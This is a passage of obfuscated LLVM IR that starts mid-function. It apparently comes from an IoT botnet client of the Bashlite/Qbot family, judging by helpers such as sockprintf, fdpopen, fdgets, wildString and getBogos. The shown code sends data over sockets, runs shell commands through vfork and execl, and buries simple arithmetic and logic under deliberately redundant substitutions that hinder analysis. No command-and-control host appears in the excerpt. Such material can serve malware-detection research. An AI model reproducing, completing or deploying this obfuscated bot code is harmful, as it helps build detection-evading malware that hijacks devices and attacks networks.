  %64 = sub i32 %63, 48
  %65 = add i32 %64, 1156220805
  %66 = sub nsw i32 %62, 48
  %67 = sub i32 %65, 1466622444
  %68 = sub i32 %67, 10
  %69 = add i32 %68, 1466622444
  %70 = sub nsw i32 %65, 10
  %71 = load i32, i32* %18, align 4
  %72 = sub i32 0, %69
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, %69
  store i32 %73, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %61, %55
  %76 = load i32, i32* %18, align 4
  %77 = sub i32 0, 48
  %78 = sub i32 %76, %77
  %79 = add nsw i32 %76, 48
  %80 = trunc i32 %78 to i8
  %81 = load i8*, i8** %17, align 8
  %82 = getelementptr inbounds i8, i8* %81, i32 -1
  store i8* %82, i8** %17, align 8
  store i8 %80, i8* %82, align 1
  %83 = load i32, i32* %11, align 4
  %84 = load i32, i32* %21, align 4
  %85 = udiv i32 %84, %83
  store i32 %85, i32* %21, align 4
  br label %52

; <label>:86:                                     ; preds = %52
  %87 = load i32, i32* %19, align 4
  %88 = icmp ne i32 %87, 0
  br i1 %88, label %89, label %121

; <label>:89:                                     ; preds = %86
  %90 = load i32, i32* %13, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %117

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %14, align 4
  %94 = xor i32 %93, -1
  %95 = xor i32 2, -1
  %96 = xor i32 -1963461345, -1
  %97 = or i32 %94, %95
  %98 = or i32 -1963461345, %96
  %99 = xor i32 %97, -1
  %100 = and i32 %99, %98
  %101 = and i32 %93, 2
  %102 = icmp ne i32 %100, 0
  br i1 %102, label %103, label %117

; <label>:103:                                    ; preds = %92
  %104 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %104, i32 45)
  %105 = load i32, i32* %20, align 4
  %106 = sub i32 0, %105
  %107 = sub i32 0, 1
  %108 = add i32 %106, %107
  %109 = sub i32 0, %108
  %110 = add nsw i32 %105, 1
  store i32 %109, i32* %20, align 4
  %111 = load i32, i32* %13, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, -1
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add nsw i32 %111, -1
  store i32 %115, i32* %13, align 4
  br label %120

; <label>:117:                                    ; preds = %92, %89
  %118 = load i8*, i8** %17, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 -1
  store i8* %119, i8** %17, align 8
  store i8 45, i8* %119, align 1
  br label %120

; <label>:120:                                    ; preds = %117, %103
  br label %121

; <label>:121:                                    ; preds = %120, %86
  %122 = load i32, i32* %20, align 4
  %123 = load i8**, i8*** %9, align 8
  %124 = load i8*, i8** %17, align 8
  %125 = load i32, i32* %13, align 4
  %126 = load i32, i32* %14, align 4
  %127 = call i32 @prints(i8** %123, i8* %124, i32 %125, i32 %126)
  %128 = sub i32 0, %127
  %129 = sub i32 %122, %128
  %130 = add nsw i32 %122, %127
  store i32 %129, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %121, %25
  %132 = load i32, i32* %8, align 4
  ret i32 %132
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.41, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %65

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %63

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 65280, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65280
  %62 = ashr i32 %60, 8
  br label %63

; <label>:63:                                     ; preds = %53, %52
  %64 = phi i32 [ -1, %52 ], [ %62, %53 ]
  store i32 %64, i32* %2, align 4
  br label %65

; <label>:65:                                     ; preds = %63, %19
  %66 = load i32, i32* %2, align 4
  ret i32 %66
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %8, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %7, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %4, align 8
  br label %47

; <label>:47:                                     ; preds = %45, %44
  %48 = phi i8* [ null, %44 ], [ %46, %45 ]
  ret i8* %48
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %27

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = and i64 %16, %22
  %24 = xor i64 %16, %22
  %25 = or i64 %23, %24
  %26 = or i64 %16, %22
  store i64 %25, i64* %3, align 8
  br label %4

; <label>:27:                                     ; preds = %12
  %28 = load i64, i64* %3, align 8
  ret i64 %28
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %84 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %57
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %121

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 true, %30
  %32 = xor i1 true, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, true
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = xor i1 true, true
  %50 = and i1 %49, true
  %51 = and i1 true, %47
  %52 = or i1 %46, %48
  %53 = or i1 %50, %51
  %54 = xor i1 %52, %53
  %55 = xor i1 %44, true
  %56 = zext i1 %54 to i32
  store i32 %56, i32* %3, align 4
  br label %121

; <label>:57:                                     ; preds = %2
  %58 = load i8*, i8** %5, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br i1 %61, label %62, label %75

; <label>:62:                                     ; preds = %57
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 1
  %65 = load i8*, i8** %5, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = call i32 @wildString(i8* %64, i8* %66)
  %68 = icmp ne i32 %67, 0
  %69 = xor i1 %68, true
  %70 = and i1 true, %69
  %71 = xor i1 true, true
  %72 = and i1 %68, %71
  %73 = or i1 %70, %72
  %74 = xor i1 %68, true
  br label %75

; <label>:75:                                     ; preds = %62, %57
  %76 = phi i1 [ false, %57 ], [ %73, %62 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = or i1 %78, %80
  %82 = xor i1 %76, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %121

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #10
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #10
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %107

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = or i1 %102, %104
  %106 = xor i1 %100, true
  br label %107

; <label>:107:                                    ; preds = %94, %84
  %108 = phi i1 [ false, %84 ], [ %105, %94 ]
  %109 = xor i1 %108, true
  %110 = and i1 false, %109
  %111 = xor i1 false, true
  %112 = and i1 %108, %111
  %113 = xor i1 true, true
  %114 = and i1 %113, false
  %115 = and i1 true, %111
  %116 = or i1 %110, %112
  %117 = or i1 %114, %115
  %118 = xor i1 %116, %117
  %119 = xor i1 %108, true
  %120 = zext i1 %118 to i32
  store i32 %120, i32* %3, align 4
  br label %121

; <label>:121:                                    ; preds = %107, %75, %43, %9
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

; <label>:7:                                      ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 %10) #10
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3

; <label>:16:                                     ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.42, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

